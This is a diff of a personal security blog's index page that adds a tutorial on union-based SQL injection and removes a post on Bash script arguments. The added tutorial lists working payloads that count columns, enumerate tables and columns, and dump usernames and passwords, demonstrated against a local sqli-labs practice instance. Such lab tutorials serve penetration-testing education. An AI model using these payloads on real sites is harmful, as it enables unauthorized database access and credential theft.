@@ -158,6 +158,102 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/SQLInjectionUnion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/24/SQLInjectionUnion/" class="post-title-link" itemprop="url">Union Sql Injection Detection Methods</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-24 19:11:44" itemprop="dateCreated datePublished" datetime="2016-10-24T19:11:44-04:00">2016-10-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 20:46:23" itemprop="dateModified" datetime="2023-10-18T20:46:23-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Union Sql Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol>
+<li>First, check for the existence of an SQL injection vulnerability.</li>
+<li>Then, determine the injection type: character-based, numeric-based, or search-based.</li>
+<li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li>
+<li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li>
+<li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li>
+<li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>
+These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li>
+</ol>
+<h1 id="Example-of-Union-Sql-Injection-Operation"><a href="#Example-of-Union-Sql-Injection-Operation" class="headerlink" title="Example of Union Sql Injection Operation"></a>Example of Union Sql Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/23/SQLInjectionSearch-Based/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1054,135 +1150,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2012/03/07/BashScript03-Arguments/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2012/03/07/BashScript03-Arguments/" class="post-title-link" itemprop="url">Bash Scripting 03 - Arguments</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2012-03-07 20:53:07" itemprop="dateCreated datePublished" datetime="2012-03-07T20:53:07-05:00">2012-03-07</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-23 21:49:42" itemprop="dateModified" datetime="2023-10-23T21:49:42-04:00">2023-10-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/" itemprop="url" rel="index"><span itemprop="name">Bash</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Bash/Bash-Scripting-03-Arguments/" itemprop="url" rel="index"><span itemprop="name">Bash Scripting 03 - Arguments</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Not all Bash scripts require arguments. However, it is extremely important to understand how<br>they are interpreted by Bash and how to use them. We have already executed Linux commands<br>with arguments. For example, when we run the command <code>ls -l /var/log</code>, both <code>-l</code> and <code>/var/log</code><br>are arguments to the ls command.<br>Bash scripts are no different; we can supply command-line arguments and use them in our scripts:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ <span class="built_in">cat</span> ./arg.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;The first two arguments are <span class="variable">$1</span> and <span class="variable">$2</span>&quot;</span></span><br><span class="line">kali@kali:~$ <span class="built_in">chmod</span> +x ./arg.sh</span><br><span class="line">kali@kali:~$ ./arg.sh hello there</span><br><span class="line">The first two arguments are hello and there</span><br></pre></td></tr></table></figure>
-<p>Here we created a simple Bash script, set executable permissions on it, and then ran it<br>with two arguments. The $1 and $2 variables represent the first and second arguments passed to<br>the script. Let’s explore a few special Bash variables:</p>
-<table>
-<thead>
-<tr>
-<th>Variable Name</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>$0</td>
-<td>The name of the Bash script</td>
-</tr>
-<tr>
-<td>$1 - $9</td>
-<td>The first 9 arguments to the Bash script</td>
-</tr>
-<tr>
-<td>$#</td>
-<td>Number of arguments passed to the Bash script</td>
-</tr>
-<tr>
-<td>$@</td>
-<td>All arguments passed to the Bash script</td>
-</tr>
-<tr>
-<td>$?</td>
-<td>The exit status of the most recently run process</td>
-</tr>
-<tr>
-<td>$$</td>
-<td>The process ID of the current script</td>
-</tr>
-<tr>
-<td>$USER</td>
-<td>The username of the user running the script</td>
-</tr>
-<tr>
-<td>$HOSTNAME</td>
-<td>The hostname of the machine</td>
-</tr>
-<tr>
-<td>$RANDOM</td>
-<td>A random number</td>
-</tr>
-<tr>
-<td>$LINENO</td>
-<td>The current line number in the script</td>
-</tr>
-</tbody></table>
-<p>Some of these special variables can be very useful when debugging a script. For example, we might<br>be able to obtain the exit status of a command to determine whether it was successfully executed<br>or not.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1254,19 +1221,19 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-count">63</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -1294,7 +1261,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
